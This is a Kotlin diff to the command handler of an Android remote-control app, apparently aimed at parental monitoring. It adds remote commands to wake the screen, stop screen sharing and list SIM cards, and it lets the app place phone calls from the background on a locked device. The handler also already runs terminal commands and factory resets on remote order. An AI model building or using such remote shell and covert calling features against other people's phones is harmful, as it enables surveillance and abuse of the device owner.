@@ -62,6 +62,15 @@ object CommandExecutor {
                     ok("تم إيقاف الكاميرا")
                 }
                 "screen_status" -> screenStatus()
+                "screen_stop" -> {
+                    ScreenShareService.stop(context)
+                    ok("تم إيقاف مشاركة الشاشة")
+                }
+                "wake" -> {
+                    wakeScreen(context)
+                    ok("تم إيقاظ شاشة الجهاز")
+                }
+                "sims" -> simsInfo(context)
                 "terminal" -> TerminalService.execute(context, payload["cmd"]?.toString().orEmpty())
                 "device_info" -> TerminalService.deviceSummary(context)
                 "factory_reset" -> factoryReset(context)
@@ -147,14 +156,58 @@ object CommandExecutor {
         if (!Permissions.has(context, Manifest.permission.CALL_PHONE)) {
             return fail("يتطلب صلاحية الاتصال الهاتفي")
         }
-        val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:" + android.net.Uri.encode(number)))
-            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        return try {
-            context.startActivity(intent)
-            ok("تم بدء الاتصال بـ $number")
+        wakeScreen(context)
+        val uri = android.net.Uri.parse("tel:" + android.net.Uri.encode(number))
+        val simIndex = payload["simIndex"]?.toString()?.toIntOrNull() ?: -1
+        try {
+            // placeCall يعمل من الخلفية (حتى والشاشة مقفلة) بدون فتح التطبيق
+            val tm = context.getSystemService(Context.TELECOM_SERVICE) as android.telecom.TelecomManager
+            val accounts = tm.callCapablePhoneAccounts
+            val extras = android.os.Bundle()
+            if (simIndex in accounts.indices) {
+                extras.putParcelable(android.telecom.TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, accounts[simIndex])
+            }
+            tm.placeCall(uri, extras)
+            val sim = if (simIndex in accounts.indices) " (الشريحة ${simIndex + 1})" else ""
+            return ok("تم بدء الاتصال بـ $number$sim")
         } catch (e: Exception) {
-            fail("تعذر بدء الاتصال: ${e.localizedMessage}")
+            return try {
+                context.startActivity(
+                    Intent(Intent.ACTION_CALL, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
+                )
+                ok("تم بدء الاتصال بـ $number")
+            } catch (e2: Exception) {
+                fail("تعذر بدء الاتصال: ${e2.localizedMessage ?: e.localizedMessage}")
+            }
         }
+    }
+
+    /** إيقاظ الشاشة مؤقتاً حتى تظهر واجهة المكالمة على القفل. */
+    private fun wakeScreen(context: Context) {
+        try {
+            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+            @Suppress("DEPRECATION")
+            val lock = pm.newWakeLock(
+                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
+                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or
+                    android.os.PowerManager.ON_AFTER_RELEASE,
+                "kids:wake",
+            )
+            lock.acquire(15_000L)
+        } catch (e: Exception) { /* تجاهل */ }
+    }
+
+    private fun simsInfo(context: Context): Map<String, Any> {
+        val list = DeviceInfo.sims(context)
+        if (list.isEmpty()) return fail("لا توجد شرائح اتصال متاحة")
+        val text = list.joinToString("\n") { "${it["index"]}: ${it["label"]}" }
+        return mapOf(
+            "ok" to true,
+            "message" to "عدد الشرائح: ${list.size}",
+            "stdout" to text,
+            "sims" to list,
+            "exitCode" to 0,
+        )
     }
 
     private fun startCamera(context: Context, facing: Int): Map<String, Any> {
